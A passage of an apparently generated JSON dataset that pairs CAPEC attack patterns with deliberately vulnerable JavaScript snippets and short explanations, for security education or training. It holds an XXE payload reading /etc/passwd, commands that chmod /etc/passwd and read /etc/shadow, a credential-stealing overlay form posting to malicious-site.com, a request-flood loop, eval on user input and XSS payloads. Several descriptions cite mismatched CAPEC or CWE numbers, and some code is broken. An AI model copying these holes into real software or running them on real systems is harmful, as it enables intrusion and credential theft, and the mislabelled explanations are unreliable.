        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  try {\n    // Simulate processing of request\n    if (Math.random() < 0.5) {\n      throw new Error('Random processing error');\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Request processed successfully');\n  } catch (err) {\n    // Log error with sensitive information\n    console.error(`Error processing request from ${req.connection.remoteAddress}: ${err.message}`);\n    // Send error response with sensitive information\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end(`Internal Server Error: ${err.message}`);\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://127.0.0.1:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server processes incoming requests and randomly throws an error to simulate unexpected conditions. When an error occurs, it logs the error message along with the client's IP address and sends an error response back to the client containing the error message. This demonstrates the concept of 'Fuzzing for application mapping' (CAPEC) by showing how an attacker could send random requests to trigger errors and observe the application's responses. The code also embodies related CWEs by exposing sensitive information in error messages and logs, such as the client's IP address and internal error details."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Missing authentication for critical function (CWE-306)\n    console.log('Received data:', data.toString());\n    // Improper enforcement of message integrity (CWE-924)\n    if (data.toString().includes('malicious')) {\n      console.log('Warning: Malicious data detected');\n    }\n    // Improper verification of source (CWE-940)\n    if (socket.remoteAddress !== 'expected.address') {\n      console.log('Warning: Unexpected source');\n    }\n  });\n});\n\nserver.listen(8080, '127.0.0.1', () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates a TCP server using the 'net' module. The server listens for incoming data on port 8080. The code demonstrates several vulnerabilities: it does not authenticate the source of the data (CWE-306), it does not enforce message integrity (CWE-924), and it does not properly verify the source of the communication (CWE-940). Additionally, it logs a warning if the data contains the string 'malicious' or if the source address is unexpected, but these checks are insufficient to secure the communication channel. This represents the main idea of CAPEC-272, where an adversary can manipulate the communication channel to compromise its security."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "const https = require('https');\n\nconst options = {\n  hostname: 'example.com',\n  port: 443,\n  path: '/data',\n  method: 'GET',\n  rejectUnauthorized: false // CWE-294: Improper verification of SSL/TLS certificates\n};\n\nconst req = https.request(options, (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    console.log('Received data:', data); // CWE-201: Insertion of sensitive information into sent data\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates an HTTPS request to a server with an incorrectly configured SSL/TLS setup. The 'rejectUnauthorized: false' option disables SSL/TLS certificate validation, which is a common misconfiguration (CWE-294). This allows an adversary to perform a man-in-the-middle attack by intercepting and potentially modifying the data being transmitted. Additionally, the code logs the received data, which may include sensitive information (CWE-201). This snippet embodies the main idea of CAPEC-153 by showing how improper SSL/TLS configuration can lead to data exposure and potential command injection."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "const xml2js = require('xml2js');\nconst axios = require('axios');\n\nasync function sendRequest(xmlMessage) {\n  try {\n    // Missing XML Validation (CWE-112)\n    const parser = new xml2js.Parser();\n    const parsedMessage = await parser.parseStringPromise(xmlMessage);\n\n    // Incorrectly Specified Destination (CWE-941)\n    const destinationUrl = parsedMessage.destinationUrl[0];\n\n    // Insufficient Verification of Data Authenticity (CWE-345)\n    // Improper Enforcement of Message Integrity (CWE-924)\n    const response = await axios.post(destinationUrl, xmlMessage, {\n      headers: { 'Content-Type': 'application/xml' }\n    });\n\n    console.log('Response:', response.data);\n  } catch (error) {\n    console.error('Error:', error);\n  }\n}\n\n// Example of a spoofed UDDI/ebXML message\nconst spoofedMessage = `\n<message>\n  <destinationUrl>http://malicious-actor.com</destinationUrl>\n  <data>Important transaction data</data>\n</message>`;\n\nsendRequest(spoofedMessage);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can spoof a UDDI/ebXML message to impersonate a service provider in an e-business transaction. The code lacks proper XML validation (CWE-112), does not verify the authenticity of the data (CWE-345), and does not ensure message integrity during transmission (CWE-924). Additionally, it incorrectly specifies the destination URL (CWE-941), allowing an attacker to redirect the message to a malicious endpoint. This can lead to sensitive information disclosure, loss of message integrity, or financial fraud."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => { body += chunk; });\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, { 'Content-Type': 'text/plain' });\n        res.end('Invalid XML');\n        return;\n      }\n\n      // CWE-112: Missing XML Validation\n      // No schema validation is performed here\n\n      // CWE-611: Improper Restriction of XML External Entity Reference\n      // External entities are not disabled\n\n      // CWE-441: Unintended Proxy or Intermediary\n      // Forwarding the request without preserving the original source\n      const options = {\n        hostname: 'external-service.com',\n        port: 80,\n        path: '/process',\n        method: 'POST',\n        headers: {\n          'Content-Type': 'application/xml'\n        }\n      };\n\n      const proxyReq = http.request(options, proxyRes => {\n        let proxyData = '';\n        proxyRes.on('data', chunk => { proxyData += chunk; });\n        proxyRes.on('end', () => {\n          res.writeHead(200, { 'Content-Type': 'application/xml' });\n          res.end(proxyData);\n        });\n      });\n\n      proxyReq.on('error', e => {\n        res.writeHead(500, { 'Content-Type': 'text/plain' });\n        res.end('Proxy error');\n      });\n\n      proxyReq.write(body);\n      proxyReq.end();\n    });\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This JavaScript code snippet sets up an HTTP server that processes incoming XML requests and forwards them to an external service. The code demonstrates several vulnerabilities related to XML Routing Detour Attacks (CAPEC-94) and associated CWEs:\n\n1. **CWE-112: Missing XML Validation** - The XML input is parsed without validating it against a schema, allowing potentially malicious XML to be processed.\n2. **CWE-611: Improper Restriction of XML External Entity Reference** - The XML parser does not disable external entities, which could lead to XML External Entity (XXE) attacks.\n3. **CWE-441: Unintended Proxy or Intermediary** - The server forwards the request to an external service without preserving the original source, making it act as an unintended proxy.\n\nThe code captures the essence of an XML Routing Detour Attack by showing how an attacker could exploit these weaknesses to reroute and manipulate XML processing through a compromised intermediary."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(8080, '127.0.0.1', () => {\n    console.log('Connected');\n    // Weak algorithm selection (CWE-757)\n    client.write('ALGO:WEAK');\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    // Capture-replay vulnerability (CWE-294)\n    if (data.toString() === 'AUTH:SUCCESS') {\n        client.write('REPLAY:AUTH:SUCCESS');\n    }\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});\n\n// Incorrectly specified destination (CWE-941)\nclient.connect(8080, '192.168.1.1');\n\n// Direct use of sockets (CWE-246)\nconst server = net.createServer((socket) => {\n    socket.on('data', (data) => {\n        console.log('Server received: ' + data);\n        if (data.toString() === 'ALGO:WEAK') {\n            socket.write('AUTH:SUCCESS');\n        }\n    });\n});\nserver.listen(8080, '127.0.0.1');",
        "description": "This JavaScript code snippet demonstrates a client-server communication setup using raw sockets, which is a bad practice in J2EE applications (CWE-246). The client connects to a server and negotiates a weak algorithm for communication (CWE-757). The server responds with an 'AUTH:SUCCESS' message, which the client captures and replays (CWE-294). Additionally, the client attempts to connect to an incorrect destination (CWE-941). This code embodies the main idea of CAPEC 'Client-Server Protocol Manipulation' by showcasing how an adversary can exploit protocol weaknesses to perform unexpected actions."
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst xml2js = require('xml2js');\n\nconst app = express();\napp.use(express.text());\n\napp.post('/upload', (req, res) => {\n  const parser = new xml2js.Parser({\n    explicitEntity: true\n  });\n\n  parser.parseString(req.body, (err, result) => {\n    if (err) {\n      res.status(400).send('Invalid XML');\n      return;\n    }\n\n    // Process the parsed XML\n    res.send('XML processed successfully');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts XML data via a POST request to the '/upload' endpoint. The xml2js library is used to parse the incoming XML data. The parser is configured with 'explicitEntity: true', which allows external entities to be processed. This can be exploited by an attacker to include external entities that reference large or resource-intensive URIs, potentially leading to a denial of service (DoS) condition. This snippet embodies the main idea of the CAPEC by demonstrating how improper handling of XML external entities can lead to resource exhaustion. The related CWEs are represented by the lack of restrictions on external entities (CWE-611), improper control of resource identifiers (CWE-99), and reliance on the content of the uploaded file (CWE-646)."
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
        "code_snippet": "<html>\n<head>\n  <title>Vulnerable Page</title>\n</head>\n<body>\n  <iframe src=\"https://trusted-site.com\" style=\"position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.5; z-index:2;\"></iframe>\n  <div style=\"position:absolute; top:0; left:0; width:100%; height:100%; z-index:1;\">\n    <form action=\"https://malicious-site.com/steal\" method=\"post\">\n      <input type=\"text\" name=\"username\" placeholder=\"Username\">\n      <input type=\"password\" name=\"password\" placeholder=\"Password\">\n      <input type=\"submit\" value=\"Login\">\n    </form>\n  </div>\n</body>\n</html>",
        "description": "This code snippet demonstrates an iFrame overlay attack. The main idea is to trick the user into interacting with a malicious form while they believe they are interacting with a trusted site. The iFrame from 'trusted-site.com' is overlaid with partial transparency on top of a malicious form. The user interface misrepresentation (CWE-451) is achieved by making the iFrame partially transparent and placing it above the malicious form. This can lead to improper restriction of rendered UI layers or frames (CWE-1021) and can be exploited in phishing attacks. The form submission to 'malicious-site.com' represents the critical information being misrepresented and stolen."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/version') {\n    // Exposing sensitive system information\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Server Version: 1.0.0\\nOS: Linux\\n');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server listens on port 8080 and responds to requests made to the '/version' endpoint by exposing sensitive system information, such as the server version and operating system. This represents the concept of fingerprinting (CAPEC-170), where an adversary can gather information about the system. The code also embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by exposing sensitive details that could be used by an attacker to identify and exploit weaknesses in the system."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  let sessionId = req.headers['cookie']?.split('=')[1];\n  if (!sessionId) {\n    sessionId = 'default-session-id'; // CWE-565: No validation of session ID\n  }\n  // CWE-472: External control of assumed-immutable web parameter\n  if (req.url.includes('admin')) {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome, admin!');\n  } else {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome, user!');\n  }\n});\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads the session ID from the cookie header without validating it (CWE-565). If the session ID is not present, it defaults to a 'default-session-id', which is insecure. The code also demonstrates CWE-472 by allowing external control of the URL parameter to access admin functionality without proper validation. This setup can be exploited by an attacker to manipulate session credentials and gain unauthorized access to the application, embodying the main idea of CAPEC-139: Session Credential Falsification through Manipulation."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "const http = require('http');\n\nfunction makeRequest() {\n  const options = {\n    hostname: 'target-server.com',\n    port: 80,\n    path: '/resource-intensive-endpoint',\n    method: 'GET'\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {\n      // Simulate processing of data to keep the connection open\n      console.log(`Received chunk: ${chunk}`);\n    });\n\n    res.on('end', () => {\n      // Make another request immediately after the previous one ends\n      makeRequest();\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  req.end();\n}\n\n// Start the first request\nmakeRequest();",
        "description": "This JavaScript code snippet demonstrates a sustained client engagement attack. It continuously makes HTTP GET requests to a target server's resource-intensive endpoint. Each request is designed to keep the connection open by processing incoming data chunks, and upon completion, it immediately initiates another request. This loop effectively ties up the server's resources, making them unavailable to legitimate users. The code embodies the CAPEC's main idea by exploiting uncontrolled resource consumption (CWE-400) and the lack of resource allocation limits (CWE-770)."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "const xml2js = require('xml2js');\nconst fs = require('fs');\n\nconst xmlData = `<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>`;\n\nxml2js.parseString(xmlData, (err, result) => {\n  if (err) {\n    console.error('Error parsing XML:', err);\n  } else {\n    console.log('Parsed XML:', result);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a DTD Injection vulnerability. It uses the 'xml2js' library to parse an XML string that includes a malicious DTD. The DTD defines an external entity 'xxe' that references the '/etc/passwd' file. When the XML is parsed, the external entity is expanded, potentially exposing sensitive file contents. This example embodies the main idea of CAPEC-112 (DTD Injection) and highlights related weaknesses such as CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-827 (Improper Control of Document Type Definition)."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\n\nconst app = express();\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/upload', (req, res) => {\n  const parser = new xml2js.Parser();\n  parser.parseString(req.body, (err, result) => {\n    if (err) {\n      res.status(400).send('Invalid XML');\n      return;\n    }\n    // Simulate processing of the parsed XML data\n    res.send('XML processed successfully');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts XML data via a POST request. The XML data is parsed using the xml2js library. The code does not impose any restrictions on the size or complexity of the XML data being parsed, which can lead to a denial of service (DoS) condition if an attacker sends a large or deeply nested XML payload. This embodies the main idea of the CAPEC 'Serialized Data Parameter Blowup' by demonstrating how inefficient parsing of serialized data (XML in this case) can exhaust CPU resources. The related CWEs provide additional context: CWE-770 (no resource limits), CWE-611 (potential XML External Entity injection), and CWE-74 (improper neutralization of special elements)."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "const xml2js = require('xml2js');\n\nconst xmlData = `\n<root>\n  <item>\n    <subitem>\n      <subsubitem>\n        <subsubsubitem>\n          <!-- Nested payloads continue -->\n        </subsubsubitem>\n      </subsubitem>\n    </subitem>\n  </item>\n</root>`;\n\nfunction parseXML(data) {\n  const parser = new xml2js.Parser();\n  parser.parseString(data, (err, result) => {\n    if (err) {\n      console.error('Error parsing XML:', err);\n      return;\n    }\n    console.log('Parsed XML:', result);\n  });\n}\n\nparseXML(xmlData);",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability related to 'Serialized Data with Nested Payloads' (CAPEC). The code uses the 'xml2js' library to parse an XML string that contains deeply nested elements. The XML data is structured in such a way that it could cause excessive memory consumption and CPU utilization when parsed, due to the uncontrolled recursion and lack of proper input validation (CWE-674, CWE-20). The parser does not validate the XML against a schema (CWE-112), and there are no limits or throttling on resource allocation (CWE-770). This example highlights the risk of processing deeply nested or maliciously crafted XML data without proper safeguards."
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk;\n    // CWE-770: No limit on the size of the data being received\n  });\n\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, {'Content-Type': 'text/plain'});\n        res.end('Invalid XML');\n        return;\n      }\n      // CWE-112: No XML schema validation\n      // CWE-674: Potential for uncontrolled recursion in XML parsing\n      res.writeHead(200, {'Content-Type': 'application/json'});\n      res.end(JSON.stringify(result));\n    });\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet sets up a basic HTTP server using Node.js that accepts XML data from a client. The server reads the incoming data without imposing any size limits (CWE-770), which can lead to resource exhaustion if an oversized payload is sent. The XML data is then parsed without any schema validation (CWE-112), making it vulnerable to maliciously crafted XML. Additionally, the XML parser could be susceptible to uncontrolled recursion (CWE-674) if the XML data is deeply nested. This code demonstrates the main idea of the CAPEC by showing how an adversary could exploit these weaknesses to inject oversized serialized data payloads, potentially exhausting system resources or causing arbitrary code execution."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "const userRole = 'guest';\n\nfunction performAdminTask() {\n  if (userRole !== 'admin') {\n    console.log('Access Denied: Insufficient Privileges');\n    return;\n  }\n  console.log('Admin task performed');\n}\n\nfunction escalatePrivileges() {\n  userRole = 'admin'; // CWE-269: Improper Privilege Management\n  console.log('Privileges escalated to admin');\n}\n\n// Simulate privilege escalation\nescalatePrivileges();\nperformAdminTask();",
        "description": "This JavaScript code snippet demonstrates a privilege escalation vulnerability. The 'userRole' variable is initially set to 'guest', and the 'performAdminTask' function checks if the user has 'admin' privileges before performing an admin task. However, the 'escalatePrivileges' function improperly changes the 'userRole' to 'admin' without proper authorization checks, embodying CWE-269: Improper Privilege Management. This allows a user with insufficient privileges to escalate their role and perform actions they are not authorized to perform, representing the main idea of the CAPEC: Privilege Escalation."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "const { exec } = require('child_process');\nconst fs = require('fs');\n\n// Incorrect Permission Assignment for Critical Resource (CWE-732)\nfs.chmodSync('/etc/passwd', 0o777);\n\n// Execution with Unnecessary Privileges (CWE-250)\nexec('ls', { uid: 0, gid: 0 }, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});\n\n// Incorrect Use of Privileged APIs (CWE-648)\nexec('cat /etc/shadow', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet demonstrates several security weaknesses that could lead to hijacking a privileged process. The code first changes the permissions of a critical system file (`/etc/passwd`) to be world-writable (CWE-732), which allows any user to modify it. Then, it executes a command (`ls`) with unnecessary root privileges (CWE-250), which could be exploited by an attacker to perform malicious actions. Finally, it uses a privileged API to read the contents of another critical file (`/etc/shadow`) without proper checks (CWE-648). These vulnerabilities collectively illustrate how an attacker could gain control of a privileged process and execute arbitrary code with elevated privileges."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\nlet sharedResource = '';\n\nfunction privilegedOperation(data) {\n  // Simulate a privileged operation\n  sharedResource = data;\n  console.log('Privileged operation executed with data:', data);\n}\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      // Simulate authentication bypass by replay attack\n      if (body === 'replay_attack_payload') {\n        privilegedOperation(body);\n      }\n      res.end('Request processed');\n    });\n  } else {\n    res.end('Send a POST request');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet sets up an HTTP server that listens for POST requests. It simulates a privileged operation that can be hijacked by a replay attack. The `privilegedOperation` function represents a sensitive operation that modifies a shared resource. The server processes incoming POST requests and checks if the request body matches a specific payload (`replay_attack_payload`). If it does, it executes the privileged operation, demonstrating an authentication bypass vulnerability (CWE-294). The shared resource (`sharedResource`) is a non-final static element, which can be unsafe in a multi-threaded context (CWE-1058). This code embodies the main idea of hijacking a privileged thread of execution by exploiting weak authentication and improper handling of shared resources."
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "const fs = require('fs');\n\nprocess.on('SIGINT', () => {\n  try {\n    // Privileged operation\n    fs.writeFileSync('/etc/important_config', 'new_config');\n  } catch (err) {\n    // Error handling is ignored\n  }\n});\n\n// Simulate a privileged operation\nfunction privilegedOperation() {\n  // Some privileged code\n  console.log('Privileged operation running');\n}\n\n// Hijack the privileged thread\nsetTimeout(() => {\n  process.kill(process.pid, 'SIGINT');\n}, 1000);\n\nprivilegedOperation();",
        "description": "This JavaScript code snippet demonstrates a scenario where a signal handler (SIGINT) is used to perform a privileged operation (writing to '/etc/important_config'). The signal handler contains code that is not asynchronous-safe and ignores error conditions, making it vulnerable to exploitation. An attacker can hijack the privileged thread of execution by sending a SIGINT signal, causing the signal handler to execute the privileged operation. This embodies the main idea of CAPEC-30: Hijacking a Privileged Thread of Execution, and incorporates related CWEs such as CWE-828 (Signal Handler with Functionality that is not Asynchronous-Safe) and CWE-391 (Unchecked Error Condition)."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction executeNativeCode(command) {\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example of calling native code from JavaScript\nexecuteNativeCode('ls -la');",
        "description": "This JavaScript code snippet demonstrates the concept of escaping a sandbox by calling code in another language, specifically using Node.js to execute native shell commands. The 'exec' function from the 'child_process' module is used to run a shell command ('ls -la') directly from JavaScript. This can be dangerous as it allows the execution of arbitrary system commands, potentially leading to a protection mechanism failure (CWE-693) and direct use of unsafe native code (CWE-111). The error handling also prints sensitive information to the console, which could expose sensitive data (CWE-537). This snippet embodies the main idea of the CAPEC by showing how JavaScript can escape its sandbox to execute potentially unsafe native code."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const parsedUrl = url.parse(req.url, true);\n  const pathname = parsedUrl.pathname;\n\n  // Authorization check before canonicalization\n  if (!isAuthorized(req)) {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Forbidden');\n    return;\n  }\n\n  // Canonicalization of the URL\n  const canonicalPath = pathname.replace(/\\/g, '/');\n\n  // Check for restricted paths\n  if (canonicalPath.includes('/restricted')) {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Forbidden');\n    return;\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Hello, world!');\n}).listen(8080);\n\nfunction isAuthorized(req) {\n  // Dummy authorization logic\n  return req.headers['authorization'] === 'valid-token';\n}",
        "description": "This JavaScript code snippet creates an HTTP server that demonstrates a vulnerability where authorization checks are performed before URL canonicalization. The server first checks if the request is authorized based on a dummy token. If authorized, it then canonicalizes the URL by replacing backslashes with forward slashes. This sequence can be exploited by an attacker to bypass authorization checks by using non-canonical URL paths. The code also includes a check for restricted paths after canonicalization, but due to the incorrect order of operations, an attacker could potentially access restricted paths by manipulating the URL before canonicalization. This snippet embodies the main idea of the deprecated CAPEC by showing how improper handling of URL parsing and authorization can lead to security vulnerabilities, and it incorporates related CWEs such as incorrect behavior order (CWE-551) and improper protection of alternate paths (CWE-424)."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "const authenticateUser = (username, password) => {\n  // Client-side authentication (CWE-603)\n  if (username === 'admin' && password === 'password123') {\n    return true;\n  }\n  return false;\n};\n\nconst accessSensitiveData = () => {\n  if (authenticateUser(prompt('Username:'), prompt('Password:'))) {\n    // Client-side enforcement of server-side security (CWE-602)\n    alert('Access granted to sensitive data.');\n  } else {\n    alert('Access denied.');\n  }\n};\n\naccessSensitiveData();",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of client-side authentication and authorization checks. The `authenticateUser` function performs authentication on the client side by checking hardcoded credentials. The `accessSensitiveData` function then uses this client-side authentication to grant or deny access to sensitive data. This approach is insecure because an attacker can easily bypass the authentication by modifying the client-side code, thus gaining unauthorized access to sensitive data. This embodies the main idea of the deprecated CAPEC, highlighting the risks associated with relying on client-side mechanisms for security."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const filePath = req.url.substring(1); // Extract file path from URL\n\n  // CWE-20: Improper Input Validation\n  // CWE-99: Improper Control of Resource Identifiers\n  // CWE-1285: Improper Validation of Specified Index, Position, or Offset in Input\n  // CWE-1289: Improper Validation of Unsafe Equivalence in Input\n  // CWE-913: Improper Control of Dynamically-Managed Code Resources\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('File not found');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    }\n  });\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server that reads and serves files based on the URL path provided by the client. The code is vulnerable to Resource Injection attacks due to improper input validation. Specifically, it directly uses the URL path as a file path without validating it, which can lead to unintended file access or modification. This embodies the main idea of CAPEC-99 (Resource Injection) and is related to several CWEs: CWE-20 (Improper Input Validation), CWE-99 (Improper Control of Resource Identifiers), CWE-1285 (Improper Validation of Specified Index, Position, or Offset in Input), CWE-1289 (Improper Validation of Unsafe Equivalence in Input), and CWE-913 (Improper Control of Dynamically-Managed Code Resources)."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const userInput = queryObject.input;\n\n  // Vulnerable to code injection\n  eval(userInput);\n\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end('Code executed');\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. It parses the URL to extract a query parameter named 'input' and then uses the 'eval' function to execute the value of this parameter as JavaScript code. This is a classic example of code injection vulnerability (CAPEC-242), where user input is directly executed without validation. The use of 'eval' is particularly dangerous and is considered an obsolete function (CWE-477) due to its potential for introducing security risks. This snippet demonstrates how improper handling of user input can lead to severe security issues."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "const userInput = \"console.log('Hello, world!');\";\n\nfunction executeUserCode(code) {\n  eval(code);\n}\n\nexecuteUserCode(userInput);",
        "description": "This JavaScript code snippet demonstrates a code injection vulnerability. The `userInput` variable contains a string that represents code to be executed. The `executeUserCode` function takes this input and uses the `eval` function to execute it. This is a direct example of CWE-94 (Improper Control of Generation of Code) and CWE-77 (Improper Neutralization of Special Elements used in a Command). The `eval` function executes the string as code, which can be dangerous if the input is not properly sanitized, allowing an attacker to inject and execute arbitrary code."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>XSS Example</title>\n</head>\n<body>\n    <a href=\"#\" id=\"xssLink\">Click me</a>\n    <script>\n        // Simulating user input that is not properly sanitized\n        var userInput = '\" onmouseover=\"alert(\\'XSS Attack!\\')\"';\n        // Injecting the user input into an HTML attribute\n        document.getElementById('xssLink').setAttribute('href', 'javascript:void(0)' + userInput);\n    </script>\n</body>\n</html>",
        "description": "This code snippet demonstrates a Cross-Site Scripting (XSS) attack targeting HTML attributes. The user input is not properly sanitized and is directly injected into the 'href' attribute of an anchor tag. When the user hovers over the link, the malicious JavaScript code (alert('XSS Attack!')) is executed. This example embodies the main idea of CAPEC-83, CAPEC-82, and CAPEC-79, where improper neutralization of script in attributes can lead to XSS vulnerabilities."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "<a href=\"javascript:alert('XSS')\">Click me</a>",
        "description": "This code snippet demonstrates a basic example of an XSS attack targeting URI placeholders. The anchor tag's href attribute contains a 'javascript:' URI scheme, which is a common vector for XSS attacks. When a user clicks on the link, the JavaScript code within the URI is executed, triggering an alert box. This example highlights the vulnerability described in CAPEC-139, where browsers interpret 'javascript:' URIs as executable content. The related CWEs emphasize the importance of properly neutralizing script content in attributes (CWE-83), especially within tags like IMG (CWE-82), and ensuring that encoded URI schemes (CWE-84) and invalid characters (CWE-86) are correctly handled to prevent such attacks."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "const userInput = '<<script>alert(\"XSS\")<</script>'; \nconst sanitizedInput = userInput.replace(/<</g, '<'); \ndocument.body.innerHTML = sanitizedInput;",
